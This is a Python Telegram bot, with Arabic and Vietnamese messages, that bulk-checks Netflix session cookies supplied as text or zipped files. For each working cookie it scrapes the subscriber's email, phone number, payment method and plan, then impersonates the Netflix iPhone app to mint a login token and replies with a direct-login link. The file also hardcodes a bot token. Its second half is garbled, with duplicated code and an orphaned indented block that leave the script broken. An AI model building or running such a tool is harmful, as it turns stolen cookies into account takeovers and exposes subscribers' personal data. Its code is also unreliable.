import os
import re
import json
import time
import requests
import zipfile
import urllib.parse
import codecs
import logging
import tempfile
import shutil
from datetime import datetime
import uuid
import telebot

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Owner credit
OWNER_CREDIT = "Huy Vũ - https://huyvu2512.io.vn"

# إعدادات بوت التليجرام
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAHQh9fufbVd63QoICaFK8rwdRzHD9V91SI')
bot = telebot.TeleBot(BOT_TOKEN)

def unescape_plan(s):
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def format_billing_date(raw):
    """Convert ISO 8601 billing date to dd/MM/yyyy"""
    try:
        raw = raw.replace('\\x2B', '+').replace('%2B', '+').replace('\\x2b', '+')
        clean = re.sub(r'[+-]\d{2}:?\d{2}$', '', raw.split('.')[0])
        dt = datetime.strptime(clean, '%Y-%m-%dT%H:%M:%S')
        return dt.strftime('%d/%m/%Y')
    except Exception:
        try:
            date_part = raw.split('T')[0]
            y, m, d = date_part.split('-')
            return f"{d}/{m}/{y}"
        except Exception:
            return raw

def extract_netflix_id(content):
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId":
                    return cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data:
                return data["NetflixId"]
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        return cookie.get("value")
    except:
        pass
    
    netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    if netscape_match:
        netflix_id = netscape_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
    if plain_match:
        netflix_id = plain_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    return None

def extract_profiles_from_manage_profiles(response_text):
    profiles = []
    try:
        profiles_match = re.search(r'"profiles"\s*:\s*({[^}]+})', response_text)
        if profiles_match:
            profiles_json_str = profiles_match.group(1)
            def unescape_hex(match):
                hex_code = match.group(1)
                try:
                    return chr(int(hex_code, 16))
                except:
                    return match.group(0)
            cleaned_json = re.sub(r'\\x([0-9a-fA-F]{2})', unescape_hex, profiles_json_str)
            profiles_data = json.loads(f'{{{cleaned_json}}}')
            for profile_id, profile_data in profiles_data.items():
                if isinstance(profile_data, dict):
                    summary = profile_data.get('summary', {})
                    if isinstance(summary, dict):
                        value = summary.get('value', {})
                        if isinstance(value, dict):
                            profile_name = value.get('profileName')
                            if profile_name:
                                profiles.append(profile_name)
    except json.JSONDecodeError:
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', response_text)
            for profile in profile_matches:
                profile = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), profile)
                profiles.append(profile)
        except:
            pass
    return profiles

def extract_next_billing_date(response_text):
    """Extract next billing date from GraphQL response"""
    try:
        billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
        if billing_match:
            billing_data = billing_match.group(0)
            date_match = re.search(r'"date":\s*"([^"]+)"', billing_data)
            if date_match:
                return date_match.group(1)
        
        date_match = re.search(r'"nextBillingDate"[^}]+"date":\s*"([^"]+)"', response_text)
        if date_match:
            return date_match.group(1)
    except Exception as e:
        logger.error(f"Error extracting billing date: {e}")
    return "Unknown"

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        resp = session.get(url, headers=headers, timeout=30)
        txt = resp.text
        
        logger.info(f"Response status: {resp.status_code}")
        
        if any(phrase in txt.lower() for phrase in ['"mode":"login"']):
            return {'ok': False, 'err': 'Invalid cookie (login page detected)', 'cookie': cookie_dict}
        
        if '"mode":"yourAccount"' not in txt:
            return {'ok': False, 'err': 'Invalid cookie (not logged in)', 'cookie': cookie_dict}

        def find(pattern, text=txt):
            m = re.search(pattern, text)
            return m.group(1).strip() if m else None

        # Extract plan information
        plan = find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName[^}]+"value":"([^"]+)"')
        if plan:
            plan = unescape_plan(plan)
        else:
            plan = "Unknown"

        # Extract plan price
        plan_price = find(r'"planPrice"[^}]+"value":"([^"]+)"') or find(r'planPrice[^}]+value[^}]+"([^"]+)"')
        if plan_price:
            plan_price = unescape_plan(plan_price)
        else:
            plan_price = "Unknown"

        # Extract member since
        member_since = find(r'"memberSince":"([^"]+)"')
        if member_since:
            member_since = unescape_plan(member_since)
        else:
            member_since = "Unknown"

        # Extract payment method
        payment_method = find(r'"paymentMethod"[^}]+"value":"([^"]+)"')
        if not payment_method:
            payment_method = "Unknown"

        # Extract phone number
        phone = find(r'"phoneNumberDigits"[^}]+"value":"([^"]+)"')
        if phone:
            phone = phone.replace("\\x2B", "+")
        else:
            phone = "Unknown"

        # Extract phone verification status
        phone_verified_match = re.search(r'"growthPhoneNumber"[^}]+"isVerified":(true|false)', txt)
        phone_verified = "Yes" if phone_verified_match and phone_verified_match.group(1) == 'true' else "No"

        # Extract video quality
        video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"')
        if not video_quality:
            video_quality = "Unknown"

        # Extract max streams
        max_streams = find(r'"maxStreams"[^}]+"value":(\d+)')
        if not max_streams:
            max_streams = "Unknown"

        # Extract payment hold status
        payment_hold_match = re.search(r'"growthHoldMetadata"[^}]+"isUserOnHold":(true|false)', txt)
        payment_hold = "Yes" if payment_hold_match and payment_hold_match.group(1) == 'true' else "No"

        # Extract extra member status
        extra_member_match = re.search(r'"showExtraMemberSection"[^}]+"value":(true|false)', txt)
        extra_member = "Yes" if extra_member_match and extra_member_match.group(1) == 'true' else "No"

        # Extract email verification status
        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
        
        # Extract country
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
        
        # Extract email
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
        if email and email != "Unknown":
            email = urllib.parse.unquote(email)
        
        # Extract next billing date
        next_billing = extract_next_billing_date(txt)

        # Extract profiles
        profiles = []
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', txt)
            for profile in profile_matches:
                if profile and profile not in profiles:
                    profiles.append(profile)
        except Exception as e:
            logger.error(f"Error extracting profiles: {e}")
        
        profiles_str = ", ".join(profiles) if profiles else "Unknown"

        # Check account status
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_premium = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')
        is_valid = bool(status_match)
        
        if not is_valid and "NetflixId" in cookie_dict:
            is_valid = any(phrase in txt for phrase in ['Account & Billing', 'membershipStatus', 'planName'])
            is_premium = is_valid

        logger.info(f"Account validation - Valid: {is_valid}, Premium: {is_premium}")

        return {
            'ok': is_valid,
            'premium': is_premium,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'member_since': member_since,
            'payment_method': payment_method,
            'phone': phone,
            'phone_verified': phone_verified,
            'video_quality': video_quality,
            'max_streams': max_streams,
            'on_payment_hold': payment_hold,
            'extra_member': extra_member,
            'email_verified': email_verified,
            'email': email,
            'profiles': profiles_str,
            'next_billing': format_billing_date(next_billing),
            'cookie': cookie_dict
        }
    except Exception as e:
        logger.error(f"Error checking Netflix cookie: {str(e)}")
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}

def generate_token(netflix_id):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': "15.48.1",
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2012.4",
        'x-netflix.client.appversion': "15.48.1",
        'x-netflix.context.max-device-width': "375",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'x-netflix.context.locales': "en-US",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': "15.8.5",
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': "9",
        'x-netflix.context.pixel-density': "2.0",
        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
        'Cookie': f"NetflixId={netflix_id}"
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
        data = response.json()
        
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            expires = token_data["expires"]
            
            if len(str(expires)) == 13:
                expires //= 1000
                
            generation_time = int(time.time())
            time_remaining = expires - generation_time
            
            return {
                "status": "Success",
                "generation_time": generation_time,
                "expires": expires,
                "time_remaining": time_remaining,
                "token": token,
                "direct_login_url": f"https://netflix.com/unsupported?nftoken={token}"
            }
        else:
            return {"status": "Failure", "error": "No token found in response"}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

def extract_zip_and_get_files(zip_path, extract_dir):
    """Extract ZIP file and return list of .txt files"""
    txt_files = []
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        
        return txt_files
    except Exception as e:
        logger.error(f"Error extracting ZIP file: {e}")
        return []

# تليجرام بوت - معالجة المستندات والملفات والرسائل النصية
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "🎬 أهلاً بك في بوت فحص كوكيز Netflix الشامل!\n\nأرسل لي نص الكوكي مباشرة، أو ارفع ملف `.txt` أو ملف مضغوط `.zip` وسأقوم بفحصه بدقة.")

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    temp_dirs = []
    try:
        bot.reply_to(message, "⏳ جاري تحميل الملف وفحص الحسابات الشغالة فقط...")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filename = message.document.file_name
        unique_dir = tempfile.mkdtemp(prefix=f"netflix_bot_{uuid.uuid4().hex}_")
        temp_dirs.append(unique_dir)
        
        file_path = os.path.join(unique_dir, filename)
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        txt_files_to_check = []
        if filename.lower().endswith('.zip'):
            txt_files_to_check = extract_zip_and_get_files(file_path, unique_dir)
        elif filename.lower().endswith('.txt'):
            txt_files_to_check = [file_path]
            
        if not txt_files_to_check:
            bot.reply_to(message, "❌ لم يتم العثور على ملفات نصية صالحة.")
            return
            
        valid_count = 0
        for txt_file in txt_files_to_check:
            try:
                with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                
                for line in lines:
                    line = line.strip()
                    if not line:
                        continue
                        
                    netflix_id = extract_netflix_id(line)
                    if not netflix_id:
                        continue
                        
                    account_info = check_netflix_cookie({"NetflixId": netflix_id})
                    
                    # شرط الصلاحية الحقيقية: يجب أن يكون الحساب شغالاً والباقة ومعلومات التجديد معروفة وليست Unknown
                    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
                        valid_count += 1
                        token_result = generate_token(netflix_id)
                        
                        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
                        res_msg += f"🌍 البلد: `{account_info['country']}`\n"
                        res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
                        res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
                        res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
                        res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
                        res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
                        
                        if token_result.get('status') == 'Success':
                            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
                            res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
                            
                        bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
                        time.sleep(1)
            except Exception as e:
                logger.error(f"Error processing line/file: {e}")
                
        bot.reply_to(message, f"✅ انتهى الفحص. تم العثور على وإرسال ({valid_count}) حساب شغال وفعال حقاً.")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")
    finally:
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

@bot.message_handler(func=lambda message: True)
def handle_text_message(message):
    content = message.text
    if not content or content.startswith('/'):
        return
        
    bot.reply_to(message, "⏳ جاري فحص الكوكي والتحقق من حالته...")
    netflix_id = extract_netflix_id(content)
    
    if not netflix_id:
        bot.reply_to(message, "❌ لم يتم العثور على `NetflixId` صالح في النص.")
        return
        
    account_info = check_netflix_cookie({"NetflixId": netflix_id})
    
    # التحقق من أن الحساب صالح وباقته حقيقية وليست مجهولة
    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
        token_result = generate_token(netflix_id)
        
        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
        res_msg += f"🌍 البلد: `{account_info['country']}`\n"
        res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
        res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
        res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
        res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
        res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
        
        if token_result.get('status') == 'Success':
            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
            res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
            
        bot.reply_to(message, res_msg, parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ هذا الحساب غير شغال أو معلوماته غير متوفرة (منتهي أو الوهمي).", parse_mode='Markdown')
                        time.sleep(1) # توقف قصير لتفادي حظر تليجرام
            except Exception as e:
                logger.error(f"Error processing line/file: {e}")
                
        bot.reply_to(message, f"✅ انتهى الفحص. تم العثور على وإرسال ({valid_count}) حساب شغال.")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")
    finally:
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

@bot.message_handler(func=lambda message: True)
def handle_text_message(message):
    content = message.text
    if not content or content.startswith('/'):
        return
        
    bot.reply_to(message, "⏳ جاري فحص الكوكي والتحقق من الحساب...")
    netflix_id = extract_netflix_id(content)
    
    if not netflix_id:
        bot.reply_to(message, "❌ لم يتم العثور على `NetflixId` صالح في النص.")
        return
        
    account_info = check_netflix_cookie({"NetflixId": netflix_id})
    
    if account_info["ok"]:
        token_result = generate_token(netflix_id)
        
        res_msg = "🎬 *TÀI KHOẢN NETFLIX HỢP LỆ* 🎬\n\n"
        res_msg += f"🌍 *البلد:* `{account_info['country']}`\n"
        res_msg += f"📦 *الباقة:* `{account_info['plan']}`\n"
        res_msg += f"💰 *السعر:* `{account_info['plan_price']}`\n"
        res_msg += f"📅 *التجديد:* `{account_info['next_billing']}`\n"
        res_msg += f"👥 *الملفات الشخصية:* `{account_info['profiles']}`\n"
        res_msg += f"📧 *البريد:* `{account_info['email']}`\n"
        
        if token_result.get('status') == 'Success':
            mobile_url = f"https://netflix.com/unsupported?nftoken={token_result['token']}"
            res_msg += f"\n📱 *رابط الدخول المباشر:*\n`{mobile_url}`"
            
        bot.reply_to(message, res_msg, parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌ الحساب غير صالح أو منتهي:\n`{account_info.get('err', 'Unknown')}`", parse_mode='Markdown')

if __name__ == '__main__':
    logger.info("Telegram Bot is running...")
    bot.infinity_polling()
